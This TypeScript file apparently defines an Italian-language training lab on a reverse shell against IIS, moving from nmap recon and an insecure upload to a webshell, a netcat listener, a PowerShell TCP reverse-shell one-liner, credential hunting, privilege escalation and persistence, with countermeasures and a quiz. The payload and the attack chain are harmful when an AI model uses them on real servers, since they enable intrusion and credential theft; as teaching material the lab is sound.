import type { Scenario } from "../types";
import Task01Recon from "./tasks/Task01Recon";
import Task02Fingerprint from "./tasks/Task02Fingerprint";
import Task03Webshell from "./tasks/Task03Webshell";
import Task04WebshellLive from "./tasks/Task04WebshellLive";
import Task05Listener from "./tasks/Task05Listener";
import Task06Payload from "./tasks/Task06Payload";
import Task07Trigger from "./tasks/Task07Trigger";
import Task08Interact from "./tasks/Task08Interact";
import Task09Defense from "./tasks/Task09Defense";
import Task10Quiz from "./tasks/Task10Quiz";
import { reverseShellSlides } from "./slides";

export const reverseShellScenario: Scenario = {
  id: "reverse-shell",
  slug: "reverse-shell",
  title: "Reverse Shell su IIS",
  subtitle: "Da un upload dimenticato a una shell interattiva su Windows Server",
  intro:
    "Un web server Microsoft IIS con un endpoint di upload mal configurato è uno dei percorsi più classici verso una compromissione totale. In questo modulo si ripercorre l'intera catena: ricognizione, scoperta dell'upload, webshell ASPX, allestimento del listener, generazione del payload PowerShell, trigger e shell interattiva. Ogni passaggio è simulato dentro il browser — nessun vero server, nessun vero attacco — ma i flussi, i comandi e gli errori sono quelli reali.",
  slides: reverseShellSlides,
  difficulty: "Intermedio",
  status: "available",
  tasks: [
    {
      id: "01-recon",
      title: "Ricognizione: cosa espone il target",
      goal: "Scoprire che tipo di server abbiamo davanti",
      brief:
        "Prima di attaccare qualsiasi cosa dobbiamo sapere con chi abbiamo a che fare: che sistema operativo gira sul server, quali porte sono aperte e quali servizi rispondono. Questo primo passo si chiama ricognizione e non è opzionale: senza queste informazioni non possiamo nemmeno scegliere il tipo di attacco.",
      details:
        "Immagina di essere davanti a una porta chiusa: prima di forzarla vuoi sapere di che materiale è, che serratura ha, se dietro c'è un cane. Nella sicurezza informatica facciamo la stessa cosa con **nmap**, lo strumento standard per la ricognizione di rete usato in ogni pentest professionale.\n\nIl comando `nmap -sV 10.10.24.17` chiede al server: **«quali porte hai aperte, e che programma risponde su ognuna?»**. Ogni pezzo del comando ha un ruolo preciso:\n\n- `nmap` — il tool\n- `-sV` — «service version»: non solo scopri le porte aperte, ma anche il **software e la versione** che risponde\n- `10.10.24.17` — l'IP del target\n\nDalla risposta capiamo tantissimo. Le due righe più importanti in un tipico output:\n\n- Porta 80 (HTTP) → **Microsoft-IIS/10.0**\n- Sistema operativo → **Windows Server 2019**\n\nDa queste due informazioni deriva **tutta la strategia** del resto del modulo:\n\n- Web server **IIS** → possiamo caricare pagine `.aspx` che IIS eseguirà nativamente.\n- **Windows** → il linguaggio di scripting nativo è **PowerShell**, presente su ogni installazione.\n- Versione **IIS 10.0** → possiamo cercare CVE note per quella versione specifica.\n\nSe avessimo trovato scenari diversi, l'attacco sarebbe cambiato completamente:\n\n- **Apache su Linux** → PHP o CGI, payload bash, non ASPX né PowerShell\n- **Nginx** → di solito reverse proxy davanti a qualcos'altro; bisogna capire cosa\n- **Servizi non-web sospetti** (es. porta 3389 RDP aperta, porta 445 SMB, porta 22 SSH) → altri vettori d'attacco possibili\n\nLa ricognizione è il momento in cui l'attacco diventa **strategia**: non stai ancora rompendo nulla, ma stai decidendo dove colpire e con quali strumenti.",
      hint: "L'IP del target in palestra è 10.10.24.17.",
      explanation:
        "Il risultato di nmap ci dice due cose fondamentali: (1) il web server è Microsoft-IIS/10.0 → possiamo caricare pagine .aspx che IIS eseguirà, (2) il sistema operativo è Windows Server 2019 → il linguaggio di scripting nativo è PowerShell. Queste due informazioni guideranno ogni scelta successiva: che tipo di file caricare, che tipo di payload generare, quali comandi provare sul server.",
      Simulation: Task01Recon,
    },
    {
      id: "02-fingerprint",
      title: "Mappatura dell'app web",
      goal: "Trovare dove si caricano i file e dove finiscono",
      brief:
        "Ora che sappiamo che è un IIS su Windows, dobbiamo capire com'è fatto il sito. In particolare cerchiamo due cose molto specifiche: una pagina dove è possibile caricare un file, e una cartella pubblica dove quei file finiscono dopo il caricamento. Se troviamo entrambe, siamo a metà dell'opera.",
      details:
        "La catena della reverse shell si regge su **tre anelli**, e in questo task ci concentriamo sui primi due:\n\n1. Qualcuno mi lascia **caricare** un file.\n2. Posso **raggiungerlo** da un URL nel browser.\n3. Il server **esegue** quel file invece di mostrarlo (lo verificheremo nel task 4).\n\nSe manca **anche uno solo** di questi tre anelli, l'attacco non funziona. Ecco perché questa fase è così importante: capisci subito se sei di fronte a un target attaccabile o a una perdita di tempo.\n\nCosa provi, in ordine:\n\n- **Visita la home** per capire di che tipo di applicazione si tratta (CMS, portale aziendale, sito custom).\n- **Prova indirizzi comuni**: `/upload`, `/uploads/`, `/files/`, `/admin/`, `/backup/`. Sono nomi che ricorrono nel 90% delle applicazioni.\n- **Usa uno strumento di directory brute-force** come `gobuster`, `ffuf` o `dirsearch` con una wordlist standard (es. quelle di **SecLists**) per trovare cartelle e file non linkati.\n- **Leggi gli header HTTP** con `curl -I http://target`: confermano versione di **IIS** e **ASP.NET**, e a volte rivelano header custom che dicono molto sull'architettura interna.\n- **Ispeziona pagine di errore**: un `404` mal configurato può rivelare il percorso interno del filesystem, la versione di framework, gli stack trace.\n\nNel nostro caso troviamo esattamente lo scenario perfetto:\n\n- `/upload` — pagina con form per caricare file (primo anello ✓)\n- `/uploads/` — cartella pubblica dove i file caricati vengono salvati e sono raggiungibili via URL (secondo anello ✓)\n\nIl terzo anello — «i file caricati vengono davvero eseguiti come ASPX?» — lo verificheremo nel task 4 provando a caricare uno script vero. Se `/uploads/` fosse configurata come cartella statica (solo lettura, no script), tutti i nostri sforzi successivi sarebbero inutili.\n\nQuesta combinazione — endpoint di upload che accetta ogni estensione + cartella pubblica + esecuzione script — è la classe **OWASP A04: Unrestricted File Upload**. Basta rompere **uno solo** dei tre anelli per neutralizzare l'intero attacco: per esempio salvare i file in una cartella dove IIS non esegue codice.",
      hint: "Prova gli indirizzi /upload e /uploads/.",
      explanation:
        "Questa combinazione — un endpoint che accetta file + una cartella pubblica dove finiscono + esecuzione degli script in quella cartella — è la classe di vulnerabilità OWASP A04 «unrestricted file upload». Basta rompere uno solo dei tre anelli per neutralizzare l'intero attacco: per esempio salvare i file in una cartella dove IIS non esegue codice.",
      Simulation: Task02Fingerprint,
    },
    {
      id: "03-webshell",
      title: "Anatomia di una webshell ASPX",
      goal: "Capire come poche righe di codice diventano un canale di comando",
      brief:
        "Prima di scrivere qualsiasi payload, guardiamo com'è fatta la webshell più semplice possibile: un file .aspx di pochissime righe che riceve un comando dall'URL, lo esegue sul server e ci restituisce il risultato nella pagina.",
      details:
        "Una **webshell** è una pagina web che, invece di mostrarti un contenuto statico, ti fa **eseguire comandi sul server** attraverso il browser. Il meccanismo è semplicissimo, e proprio per questo è micidiale:\n\n1. La pagina legge un parametro dall'URL (es. `?cmd=whoami`).\n2. Passa quel testo al sistema operativo tramite `cmd.exe /c` o equivalente.\n3. Cattura l'output del comando.\n4. Lo scrive nel corpo della risposta HTTP.\n\nÈ come avere un terminale locale, ma trasformato in una **pagina web accessibile da chiunque conosca l'URL**. Nessuna autenticazione, nessuna cifratura, nessun log tipico di una connessione remota — solo normali richieste HTTP.\n\nIn ASP.NET bastano davvero poche righe per costruirla. I mattoni essenziali:\n\n- **Direttiva di pagina** in cima al file: `<%@ Page Language=\"C#\" %>` — dice a IIS che deve compilare ed eseguire il file come codice C#, non servirlo come testo.\n- **Lettura del parametro**: `Request[\"cmd\"]` — prende il valore di `?cmd=...` dall'URL.\n- **Esecuzione**: `System.Diagnostics.Process.Start(\"cmd.exe\", \"/c \" + cmd)` — apre un processo `cmd.exe` e gli passa il comando.\n- **Cattura dell'output**: si legge lo `StandardOutput` del processo.\n- **Scrittura in pagina**: `Response.Write(output)` — mette il risultato nella risposta HTTP.\n\nIl tutto sta in **una decina di righe di codice**. Non serve compilare in anticipo, non serve installare nulla: IIS compila la pagina **al volo** la prima volta che qualcuno la richiede.\n\nNon è ancora una reverse shell (arriverà nel task 6), ma è il **mattone di partenza**. Differenze principali:\n\n- **Webshell** → l'attaccante manda una richiesta, il server risponde con l'output. Comando singolo, connessione HTTP normale. Facile da rilevare nei log (URL strani con `?cmd=`).\n- **Reverse shell** → il server apre una connessione persistente verso l'attaccante e gli passa un terminale vero. Interattivo, molto più difficile da rilevare, ma richiede un listener sul lato attaccante.\n\nUna webshell è già di per sé una **compromissione totale**: chi la carica in una cartella eseguita da IIS ha un terminale remoto sul server, con i privilegi dell'application pool.",
      hint: "Concentrati su tre elementi: la direttiva di pagina, la lettura di ?cmd, la scrittura dell'output.",
      explanation:
        "In ASP.NET la sola presenza di `<%@ Page Language=\"C#\" %>` in un file `.aspx` è sufficiente perché IIS lo compili al volo e ne esegua il codice. È per questo che bastano davvero poche righe: non serve installare nulla, non serve compilare in anticipo, il server fa tutto da solo appena tu apri la pagina.",
      Simulation: Task03Webshell,
    },
    {
      id: "04-webshell-live",
      title: "Webshell in azione",
      goal: "Caricare cmd.aspx ed eseguire comandi dal browser",
      brief:
        "Adesso mettiamo in pratica ciò che abbiamo appena visto: carichiamo la webshell sul server, la apriamo nel browser e usiamo il suo form per lanciare qualche comando. Ogni comando che scriviamo diventa una singola richiesta HTTP; ogni risposta contiene ciò che il server ha stampato.",
      details:
        "In questa simulazione l'endpoint `/upload` accetta **qualsiasi estensione** — comprese le pagine `.aspx` — e le salva in `/uploads/`, che è una cartella dove IIS **esegue** gli script. È la vulnerabilità di upload più elementare che esista, eppure si trova ancora spessissimo in produzione. Motivi ricorrenti:\n\n- Chi ha scritto il codice pensava di limitare gli upload lato client (validazione JavaScript facile da bypassare)\n- La cartella di destinazione era pensata per file statici (immagini) ma è configurata come «tutto eseguibile»\n- Nessuno ha aggiornato il `web.config` per disabilitare handler pericolosi\n\nUna volta caricato `cmd.aspx`, aprirlo diventa banale: `http://target/uploads/cmd.aspx?cmd=whoami`. IIS compila la pagina al volo, esegue il comando, restituisce l'output nel corpo della risposta HTML.\n\nComandi di ricognizione base da provare, in ordine (dal più informativo al più intrusivo):\n\n- `whoami` — **con che utente sta girando IIS**. Determina cosa puoi fare dopo.\n- `hostname` — **nome della macchina**. Utile per capire se sei in un dominio Active Directory.\n- `ipconfig` — **configurazione di rete**. Rete interna? DMZ? Solo IPv4?\n- `dir c:\\inetpub\\wwwroot\\uploads` — **file nella cartella di atterraggio**. Vedi anche gli upload di altri.\n- `net user` — **elenco degli utenti locali**. Con i privilegi giusti, elenco anche di dominio.\n- `type c:\\inetpub\\wwwroot\\web.config` — **file di configurazione dell'applicazione**. Spesso contiene la connection string del database.\n\nUn dettaglio molto importante dal punto di vista del difensore: **ogni comando è una richiesta HTTP** visibile nei log del server (`access.log` di IIS in `C:\\inetpub\\logs\\LogFiles`). L'URL con `?cmd=whoami` è **estremamente sospetto** — un difensore attento (o un SIEM ben configurato) rileva questa attività in pochi minuti. È uno dei motivi per cui gli attaccanti spesso passano subito da webshell a reverse shell: quest'ultima genera **molto meno rumore** nei log dell'applicazione.",
      hint: "Comandi utili: whoami, hostname, ipconfig, dir c:\\inetpub\\wwwroot\\uploads.",
      explanation:
        "L'output di `whoami` mostra qualcosa come `iis apppool\\defaultapppool`: non sei né Administrator né SYSTEM, sei l'utente limitato con cui gira IIS. Puoi comunque fare parecchio (leggere `web.config`, esplorare la webroot, guardare la configurazione), ma non hai un vero terminale interattivo. Per quello serve il salto di qualità dei prossimi task: la reverse shell.",
      Simulation: Task04WebshellLive,
    },
    {
      id: "05-listener",
      title: "Allestisci il listener",
      goal: "Aprire un programma in ascolto sul tuo computer",
      brief:
        "In una reverse shell è il server a chiamare noi, non noi a chiamare il server. Prima ancora di lanciare l'attacco dobbiamo quindi preparare qualcuno che ascolti sul nostro computer: un programma che resti in attesa e accetti la connessione che, tra poco, arriverà dal server compromesso.",
      details:
        "La differenza fondamentale rispetto a una webshell: in una **reverse shell** è il server compromesso a **chiamare noi**, non noi a chiamare lui. Perché? Perché i firewall aziendali di solito bloccano le connessioni **entranti** verso i server (nessuno può aprire una porta arbitraria dall'esterno), ma lasciano quasi sempre passare le connessioni **uscenti** — un server ha bisogno di scaricare aggiornamenti, contattare API esterne, mandare email.\n\nQuindi: il payload che gireremo sul server aprirà una connessione TCP **verso di noi**, e useremo quella connessione per parlargli. Ma per poter accettare quella connessione, dobbiamo prima **preparare l'orecchio** sulla nostra macchina.\n\nLo strumento standard si chiama **netcat** (`nc`), spesso definito come il «coltellino svizzero della rete» perché fa mille cose diverse con poche righe. Il comando che useremo è:\n\n`nc -lvnp 4444`\n\nOgni lettera ha un significato preciso:\n\n- `l` — **listen**: resta in ascolto invece di connetterti\n- `v` — **verbose**: stampa a schermo tutto ciò che succede (chi si connette, quando, da che IP)\n- `n` — **niente DNS**: mostra solo indirizzi IP, senza risoluzione inversa (più veloce, meno rumore in rete)\n- `p 4444` — **port**: ascolta sulla porta 4444\n\nLa scelta della porta **non è casuale**, e riflette due considerazioni pratiche:\n\n- Sotto la porta **1024** servono privilegi di root per aprire il listener, quindi si scelgono di norma porte alte.\n- Le porte più **discrete** in un attacco reale sono `443`, `8443`, `53`: sono le porte di HTTPS e DNS, che i firewall aziendali lasciano quasi sempre uscire senza fare domande. Usare la 443 è particolarmente furbo: se qualcuno guarda i log di rete, vede «connessione verso porta 443» e non si insospettisce.\n- Nei laboratori e nella documentazione si usa per convenzione `4444` o `9001` — puramente convenzionali, non hanno significato tecnico.\n\nLa porta che scegli qui viene **ricordata e riusata automaticamente** nei task successivi per costruire un payload coerente. Se la cambi dopo aver generato il payload, il server proverà a chiamare una porta a cui nessuno risponde e la shell non si aprirà mai.\n\nAlternative moderne a `nc`, che vale la pena conoscere:\n\n- **`ncat`** (della suite nmap) — supporta SSL, più stabile.\n- **`socat`** — molto più potente, gestisce «PTY» che dà un terminale interattivo vero.\n- **Metasploit `multi/handler`** — per gestire sessioni multiple e payload Meterpreter avanzati.",
      hint: "Prova 443, 8443, 4444, 9001 o 53. Sotto 1024 in questa palestra serve root.",
      explanation:
        "Il listener è la parte «attaccante» della reverse shell: senza di lui il payload sul server tenterebbe di connettersi nel vuoto e fallirebbe subito. È come un telefono acceso in attesa di una chiamata — se lo spegni, nessuno può parlarti.",
      Simulation: Task05Listener,
    },
    {
      id: "06-payload",
      title: "Genera il payload shell.aspx",
      goal: "Costruire il file che aprirà la connessione verso di noi",
      brief:
        "Ora componiamo il payload vero e proprio: un file `shell.aspx` che, quando il server lo eseguirà, farà partire PowerShell con un comando che apre una connessione TCP verso il nostro listener. In pratica stiamo scrivendo le istruzioni che il server eseguirà per chiamarci.",
      details:
        "Il payload combina **due pezzi distinti** che lavorano insieme:\n\n- **Il file `.aspx`** — appena IIS lo apre, invece di mostrare una pagina fa partire un processo esterno: `System.Diagnostics.Process.Start(\"powershell.exe\", ...)`. È il ponte tra il web server e il sistema operativo.\n- **Una riga di PowerShell** — la classica «PowerShell reverse shell» che:\n  1. apre un **socket TCP** verso `LHOST:LPORT` (il nostro IP e la nostra porta)\n  2. collega **input** e **output** di PowerShell al socket\n  3. resta in attesa di comandi, li esegue, rimanda l'output\n\nUna versione «grezza» leggibile della riga PowerShell:\n\n```\n$c = New-Object System.Net.Sockets.TCPClient('10.0.0.5', 4444)\n$s = $c.GetStream(); [byte[]]$b = 0..65535|%{0}\nwhile(($i = $s.Read($b, 0, $b.Length)) -ne 0){\n  $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b, 0, $i)\n  $r = (iex $d 2>&1 | Out-String); $r2 = $r + 'PS ' + (pwd).Path + '> '\n  $sb = ([text.encoding]::ASCII).GetBytes($r2); $s.Write($sb, 0, $sb.Length); $s.Flush()\n}\n```\n\nPer evitare problemi con virgolette, spazi e caratteri speciali quando la stringa viene passata attraverso l'URL, il file ASPX e la riga di comando, quella riga viene **codificata in Base64** (usando UTF-16LE, che è la codifica interna di PowerShell) e passata a PowerShell con `-EncodedCommand`. Vedi il modulo Reverse Engineering per il dettaglio di questa tecnica.\n\n**Due parametri sono critici**, e sbagliarne uno significa nessuna shell:\n\n- **LHOST** — il tuo IP raggiungibile dal server:\n  - In laboratorio: il tuo IP di rete privato (192.168.x.x, 10.x.x.x)\n  - Su internet: un VPS con IP pubblico, o un tunnel (ngrok, Cloudflare Tunnel, ssh -R)\n  - Sbagliare LHOST → il server prova a connettersi a un IP a cui non ci sei, timeout\n- **LPORT** — la porta su cui il tuo listener è in ascolto:\n  - Deve essere **esattamente** quella del task precedente\n  - Sbagliare LPORT → il server chiama la porta giusta ma nessuno risponde, connection refused\n\nIl payload che stiamo generando è **completamente inerte**: è solo un file di testo. Non fa nulla finché IIS non lo esegue — cosa che succederà nel task successivo, quando lo carichiamo e lo apriamo.",
      hint: "LPORT deve coincidere con la porta del listener aperto nel task 5.",
      explanation:
        "Il pattern LHOST/LPORT è universale in tutti i payload di reverse shell: LHOST è il tuo IP raggiungibile dalla vittima, LPORT la porta su cui stai ascoltando. Sbagliare anche solo uno dei due significa nessuna connessione: il server prova a chiamare, non risponde nessuno, la shell non si apre.",
      Simulation: Task06Payload,
    },
    {
      id: "07-trigger",
      title: "Carica e trigga il payload",
      goal: "Vedere la shell aprirsi nel listener",
      brief:
        "È il momento chiave dell'intero modulo. Carichiamo `shell.aspx` nella cartella `/uploads/`, poi apriamo il suo URL dal browser. IIS lo compila ed esegue, PowerShell parte, si connette al nostro listener: sul terminale vedremo comparire il prompt della macchina remota.",
      details:
        "È il momento in cui **tutti i pezzi si incastrano**. Ecco la sequenza esatta di cosa succede, in ordine cronologico:\n\n1. **POST a `/upload`** inviando `shell.aspx` come contenuto del form. Il server accetta il file (task 4 ci ha detto che l'upload è permissivo).\n2. IIS salva il file in `C:\\inetpub\\wwwroot\\uploads\\shell.aspx`.\n3. **Apriamo nel browser** `http://target/uploads/shell.aspx` (una semplice GET, come per qualunque pagina).\n4. IIS riconosce l'estensione `.aspx`, **compila la pagina al volo** (JIT) ed **esegue** il suo codice, che chiama `System.Diagnostics.Process.Start(\"powershell.exe\", \"-EncodedCommand ...\")`.\n5. **PowerShell parte** e decodifica il comando Base64.\n6. PowerShell apre un `TCPClient(LHOST, LPORT)` — cioè apre una connessione TCP verso il nostro IP e la nostra porta.\n7. Il nostro **`nc` mostra `connect from ...`** con l'IP del server e la porta sorgente della connessione.\n8. PowerShell collega input/output al socket e stampa il prompt `PS C:\\Windows\\System32\\inetsrv>` nel nostro terminale.\n\nDa questo momento in poi **ogni comando che scriviamo nel nostro terminale viene eseguito sulla macchina remota**, esattamente come se fossimo seduti davanti a essa. La differenza pratica rispetto alla webshell del task 4:\n\n- **Persistente**: non serve rifare una richiesta HTTP per ogni comando. La connessione resta aperta.\n- **Interattivo**: puoi mantenere lo stato (variabili, `cd` in una cartella, sessione PowerShell).\n- **Meno visibile nei log dell'applicazione**: nei log di IIS vedi solo l'accesso iniziale a `shell.aspx`; tutti i comandi successivi passano nel socket TCP, non nel web server.\n\nCose che possono andare storte in questa fase (e come diagnosticarle):\n\n- **Connection refused sul listener** → LPORT sbagliata, o il listener non è più in ascolto.\n- **Nessuna connessione** → LHOST irraggiungibile dal server (firewall in mezzo, IP privato quando serve pubblico).\n- **La pagina restituisce errore 500** → probabile problema di sintassi nell'ASPX, o handler `.aspx` disabilitato nella cartella `/uploads/`.\n- **La pagina si carica ma niente arriva al listener** → antivirus/EDR sul server ha ucciso `powershell.exe` prima che completasse la connessione.\n\nMeccanicamente questa è già un'**intera compromissione**. La difesa più economica non è rilevare il file caricato (l'attaccante lo offusca), ma **impedire che venga eseguito**: basta impostare `accessPolicy=\"Read\"` sulla cartella `uploads/` nel `web.config`, e IIS smette di trattare gli `.aspx` come codice — li serve come semplici file di testo, e la catena si spezza.",
      hint: "Prima Carica, poi Trigger. Guarda il terminale a destra: la connessione entra da sola.",
      explanation:
        "Meccanicamente questa è già un'intera compromissione. La difesa più economica non è rilevare il file caricato, ma impedire che venga eseguito: basta impostare `accessPolicy=\"Read\"` sulla cartella `uploads/` e IIS smette di trattare gli `.aspx` come codice — li serve come semplici file di testo, e la catena si spezza.",
      Simulation: Task07Trigger,
    },
    {
      id: "08-interact",
      title: "Post-exploitation: dentro il server",
      goal: "Guardarsi intorno con la shell interattiva appena ottenuta",
      brief:
        "Ora abbiamo un prompt PowerShell sul server compromesso. La domanda è: cosa ce ne facciamo? Il primo passo è sempre guardarsi intorno con calma: chi siamo, su che macchina siamo finiti, quali utenti esistono, cosa contiene la configurazione dell'applicazione.",
      details:
        "Questa fase si chiama **post-exploitation** ed è dove l'attacco smette di essere una curiosità tecnica e diventa un **problema serio**. Fino a qui abbiamo dimostrato che possiamo eseguire codice. Da qui in poi trasformiamo «posso eseguire comandi» in «posso fare danni utili» — o, dal punto di vista difensivo, misuriamo quanto un attaccante può realmente ottenere.\n\nUn attaccante professionale ha un metodo strutturato per la post-exploitation:\n\n**1. Situational awareness — capire dove sono**\n\n- `whoami` / `whoami /priv` — chi sono, che privilegi ho\n- `hostname` — nome della macchina\n- `ipconfig /all` — configurazione di rete completa (DNS, dominio AD)\n- `systeminfo` — versione del sistema, patch installate, ora locale, timezone\n- `net user` / `net localgroup administrators` — utenti locali e admin\n\n**2. Ricerca di credenziali**\n\n- **Web.config** in `C:\\inetpub\\wwwroot\\` — spesso contiene connection string del database in chiaro\n- **appsettings.json** delle app .NET Core\n- **Registry**: `reg query HKLM\\SOFTWARE /s /f password` — cerca la parola «password» nel registro\n- **Sessioni cache**: file `.aspx` di altre webshell già caricate da attaccanti precedenti\n- **File .rdp, .pfx, .pem** — credenziali salvate per RDP o certificati\n\n**3. Movimento laterale (se in Active Directory)**\n\n- `whoami /groups` — a quali gruppi appartengo\n- `net view /domain` — enumera altre macchine del dominio\n- Strumenti come **BloodHound** mappano i percorsi di attacco verso Domain Admin\n\n**4. Privilege escalation**\n\nPassare da `iis apppool\\defaultapppool` (utente limitato) a **`NT AUTHORITY\\SYSTEM`** (potere assoluto). Tecniche classiche su IIS/Windows:\n\n- **Juicy Potato** / **Rogue Potato** / **PrintSpoofer** — abusano dei privilegi `SeImpersonate` che l'application pool di IIS ha di default\n- **Servizi mal configurati** — servizi con path non quotati, permessi di scrittura sui binari\n- **Task schedulati** che girano come SYSTEM e sono modificabili\n- **CVE non patchate** del kernel Windows\n\n**5. Persistenza**\n\nUna volta ottenuti privilegi alti, l'attaccante vuole **restare** anche se la webshell viene scoperta:\n\n- Nuovo utente admin\n- Task schedulato che riapre la reverse shell periodicamente\n- Modifica di un servizio esistente\n- Backdoor nel bootloader (nei casi più estremi)\n\nNel nostro task ci limitiamo a qualche comando di ricognizione base per fissare il concetto: `whoami`, `hostname`, `Get-Content C:\\inetpub\\wwwroot\\web.config`. Ma il messaggio è chiaro: **il vero danno raramente sta nel web server in sé** — sta nelle credenziali che quel web server conosce (database, servizi cloud, altri sistemi interni). Ecco perché non tenere segreti in file leggibili dal processo web — usando invece secret manager, variabili d'ambiente cifrate o vault — è una difesa più profonda di qualunque firewall applicativo.",
      hint: "Almeno: whoami, hostname, Get-Content C:\\inetpub\\wwwroot\\web.config.",
      explanation:
        "Il vero danno raramente sta nel web server in sé: sta nelle credenziali che quel web server conosce (database, servizi cloud, altri sistemi interni). Ecco perché non tenere segreti in file leggibili dal processo web — usando invece secret manager, variabili d'ambiente cifrate o vault — è una difesa più profonda di qualunque firewall applicativo.",
      Simulation: Task08Interact,
    },
    {
      id: "09-defense",
      title: "Contromisure: cosa funziona davvero",
      goal: "Distinguere le difese vere da quelle solo apparenti",
      brief:
        "Selezione multipla: fra tutte le contromisure elencate, quali avrebbero davvero fermato l'attacco che abbiamo appena eseguito (o ne avrebbero ridotto seriamente l'impatto)? Alcune sembrano difese ma non lo sono; altre sono meno intuitive ma davvero efficaci.",
      details:
        "Il modo migliore per fissare i concetti di sicurezza è ragionare **al contrario**: dato l'attacco appena visto, quali controlli avrebbero **rotto la catena** in almeno uno dei suoi anelli? È esattamente quello che fa un buon threat model.\n\n**Difese solo apparenti** (sembrano ragionevoli, non funzionano):\n\n- **Rinominare i file caricati con un hash** → non impedisce a IIS di eseguirli. Se `abc123.aspx` è nella cartella eseguibile, viene eseguito uguale.\n- **Nascondere l'header `Server: Microsoft-IIS`** → chi manda una richiesta non se ne accorge. La ricognizione moderna riconosce IIS anche senza header (fingerprint del comportamento HTTP). Difesa cosmetica.\n- **Validare l'estensione solo lato browser** → si aggira in 2 secondi con Burp, `curl`, o disabilitando JavaScript. Il client non è mai una difesa.\n- **Blacklist di estensioni** («blocco `.aspx`, `.asp`, `.php`») → si aggira con estensioni alternative (`.aspx.` con punto finale, `.asHx`, doppie estensioni `shell.jpg.aspx`), con file mime types manipolati, con encoding creativi.\n- **Antivirus tradizionale sul server** → gli attaccanti offuscano il payload per non farsi riconoscere. Aiuta contro i più pigri, non basta.\n- **Certificato TLS valido** → utile per confidenzialità e integrità del traffico, ma non c'entra nulla con l'esecuzione di file caricati.\n\n**Difese davvero efficaci** (spesso meno visibili, ma potenti):\n\n- **Whitelist di estensioni consentite** al posto della blacklist → «accetto solo `.jpg`, `.png`, `.pdf`». Se qualcosa non è nella lista, blocco. Difesa che «fallisce chiuso».\n- **Validazione del contenuto**, non solo del nome → verificare che un file dichiarato come immagine abbia davvero magic bytes di immagine.\n- **Handler disabilitati nella cartella `/uploads/`** — nel `web.config`, impostare `<handlers accessPolicy=\"Read\">`. IIS smette di trattare gli `.aspx` come eseguibili in quella cartella. **Rompe la catena all'anello 3**.\n- **Cartella upload fuori dalla webroot** → i file caricati stanno in `C:\\uploads-storage\\` (non raggiungibile via URL) e vengono serviti da un handler custom che verifica l'accesso. Rompe l'anello 2.\n- **Application pool con privilegi minimi** — il processo IIS gira come utente dedicato senza permessi di scrittura al di fuori della sua cartella, senza `SeImpersonate`. Limita drasticamente cosa può fare una shell aperta.\n- **Egress filtering** (filtro sul traffico uscente) — il server non può aprire connessioni verso IP arbitrari su porte arbitrarie. Anche se il payload viene eseguito, la connessione al listener **non parte**. Difesa spesso trascurata ma micidiale.\n- **WAF (Web Application Firewall)** con regole per pattern di webshell noti → utile come difesa in profondità, non come singola linea.\n- **EDR moderno** sul server → rileva `powershell.exe` avviato da `w3wp.exe` (processo IIS) come **anomalia comportamentale**, indipendentemente dal payload esatto.\n- **Segmentazione di rete** → il server web sta in una DMZ separata, non può raggiungere direttamente il database di produzione. Limita il danno anche a compromissione avvenuta.\n\nIl principio guida: **la sicurezza si misura sulla catena, non sui singoli anelli**. Bastano quattro misure semplici — validazione seria dell'upload, handler disabilitati in `/uploads/`, application pool a privilegi minimi, egress filter sul traffico in uscita — per rendere la catena descritta praticamente impossibile da completare, anche se le altre difese hanno una falla.",
      hint: "Chiediti per ogni voce: «un attaccante con un terminale può aggirarla?».",
      explanation:
        "La sicurezza si misura sulla catena, non sui singoli anelli. Bastano quattro misure semplici — validazione seria dell'upload, handler disabilitati in `/uploads/`, application pool a privilegi minimi, egress filter sul traffico in uscita — per rendere la catena descritta praticamente impossibile da completare.",
      Simulation: Task09Defense,
    },
    {
      id: "10-quiz",
      title: "Quiz finale — 10 domande",
      goal: "Consolidare la catena e le difese viste finora",
      brief:
        "Dieci domande brevi che ripercorrono l'intero modulo: dalla definizione di reverse shell alla scelta della porta, dall'identità dell'application pool alle contromisure che funzionano davvero. Rispondi correttamente a tutte per completare lo scenario.",
      details:
        "Ultimo passo del modulo: dieci domande che ripercorrono tutta la catena, dalla ricognizione alle difese. Le domande **non sono difficili**: servono a verificare se i concetti sono davvero entrati e se sapresti spiegarli a qualcun altro.\n\nLe domande coprono:\n\n- **Meccanica della reverse shell** — chi chiama chi, e perché è un attaccante che apre un listener e non un server\n- **Ricognizione** — cosa cerchi con `nmap` e perché versione + OS decidono l'intero attacco\n- **Webshell vs reverse shell** — differenze pratiche, quando conviene una o l'altra\n- **Scelta della porta** — perché 443 è più discreta di 4444, perché sotto 1024 serve root\n- **Application pool** — con che privilegi gira IIS di default, cosa puoi e cosa non puoi fare\n- **Contromisure** — quali fermano davvero la catena e quali sono solo cosmetiche\n\nSe qualcosa non torna:\n\n- **Torna al task corrispondente** — il quiz linka esplicitamente il concetto alla sua origine\n- Rileggi la spiegazione con il contesto pratico che ora hai: le parole «application pool» o «egress filter» ora hanno un significato concreto, non sono più solo termini\n- Rileggere dopo aver «visto» un concetto vale molto più che leggerlo due volte a freddo\n\nSi può riprovare quante volte vuoi, senza penalità. Il quiz si completa solo con **10/10**.\n\nLa lezione più importante da portare via da questo modulo: **reverse shell su IIS è un caso da manuale di come una serie di piccole trascuratezze si combinano in una compromissione grave**. Upload permissivo, cartella eseguibile, application pool troppo privilegiato, nessun egress filter — nessuno dei singoli errori è catastrofico da solo. Il problema nasce dalla loro **somma**. E la difesa più efficace è chiedersi, per ogni scelta di configurazione, «se tutto il resto fallisse, questa da sola basterebbe a fermare l'attacco?».",
      hint: "Ragiona su: chi parla per primo? con quali privilegi gira IIS? cosa vede il difensore nei log?",
      explanation:
        "Reverse shell su IIS è un caso da manuale di come una serie di piccole trascuratezze (upload permissivo, cartella eseguibile, application pool troppo privilegiato, nessun egress filter) si combinano in una compromissione grave. Nessuno dei singoli errori è catastrofico da solo; il problema nasce dalla loro somma.",
      Simulation: Task10Quiz,
    },
  ],
};
